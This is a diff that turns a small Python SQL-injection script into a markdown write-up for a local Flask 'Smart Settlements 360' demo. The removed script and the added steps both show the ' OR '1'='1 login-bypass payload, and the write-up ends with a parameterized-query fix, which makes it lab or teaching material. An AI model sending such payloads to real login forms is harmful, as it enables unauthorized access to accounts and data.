@@ -1,16 +1,23 @@
-import requests
+# 🔐 SQL Injection Exploit — Smart Settlements 360 Demo
 
-url = "http://127.0.0.1:5000/login"
+## 📌 Description
+A simulated SQL injection attack on a login form in a Flask app used in a smart settlements dashboard.
 
-# Exploit: Bypass login with SQL injection
-payload = {
-    "username": "' OR '1'='1",
-    "password": "' OR '1'='1"
-}
+## 🚀 Exploit Steps
+1. Sent malicious input via form POST:
+   - Username: `' OR '1'='1`
+   - Password: `' OR '1'='1`
+2. Server interprets query as always true
+3. Attacker bypasses authentication
 
-res = requests.post(url, data=payload)
+## 💣 Impact
+Unauthorized access to admin dashboard or sensitive data.
 
-if "Login successful" in res.text:
-    print("[+] Exploit worked! Access granted without credentials.")
-else:
-    print("[-] Exploit failed.")
+## 🧰 Tools Used
+- Flask
+- Python Requests
+
+## ✅ Fix
+Update vulnerable query:
+```python
+cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
